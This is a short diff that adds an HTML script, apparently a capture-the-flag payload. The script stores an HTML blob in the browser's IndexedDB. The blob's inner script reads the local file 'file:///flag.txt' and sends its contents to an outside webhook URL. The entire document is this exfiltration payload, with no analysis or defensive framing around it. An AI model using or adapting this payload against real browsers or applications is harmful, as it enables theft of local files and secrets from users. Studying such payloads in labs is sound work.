@@ -1,0 +1,22 @@
+<script>
+    const req = indexedDB.open("mydb", 1);
+    req.onupgradeneeded = e => {
+      const db = e.target.result;
+      db.createObjectStore("files");
+    };
+    req.onsuccess = e => {
+      const db = e.target.result;
+      const tx = db.transaction("files", "readwrite");
+      const store = tx.objectStore("files");
+      const blob = new Blob([`<html><body>
+        <script>
+            fetch('file:///flag.txt')
+        .then(r => r.text())
+        .then(text => fetch('https://webhook/?'+text, { mode: 'no-cors' }))
+        .catch(err => console.error('Fetch error (likely blocked):', err));
+            <\/script>
+        </body></html>`], {type: "text/html"});
+      store.put(blob, "page1");
+      tx.oncomplete = () => console.log("HTML blob saved");
+    };
+</script>
